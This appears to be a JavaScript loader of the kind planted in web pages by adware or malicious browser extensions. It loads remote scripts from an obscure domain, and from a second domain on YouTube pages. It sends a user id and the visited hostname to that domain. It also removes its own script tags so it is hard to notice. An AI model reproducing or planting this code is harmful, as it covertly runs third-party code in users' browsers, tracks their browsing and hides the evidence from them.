void function(){if(window.self!==window.top)return;var pid='ins00',uid='3732c0ad-62e1-48a8-b47d-4ebda7810c1b',osid='10064',ts=1466622360705,h=0;var extadActive = (Date.now() - ts > 7200000) ? 1 : 0;
inject('//msmdzbsyrw.org/app/noext/main.php?pid=' + pid + '&eid=2&uid=' + uid + '&host=' + location.hostname + '&active=' + extadActive + '&extad_init=' + (window.EXTADinit ? 1 : 0)+'&h='+h+'&ts='+ts);
location.hostname === 'www.youtube.com' && inject('https://www.u-bar.org/js/download.js');
removeSelf();
function removeSelf() {
  var scr=document.getElementById('ubar-loader')||document.getElementById('videoplugin-loader');
  scr&&tryToRemove(scr);
}
function inject(src){
  var scr=document.createElement('script');
  scr.src=src;
  scr.onload=scr.onerror=function(){setTimeout(function(){tryToRemove(scr)},0)};
  document.body.appendChild(scr);
}
function tryToRemove(node){try{node.parentNode.removeChild(node)}catch(ex){}}
}();
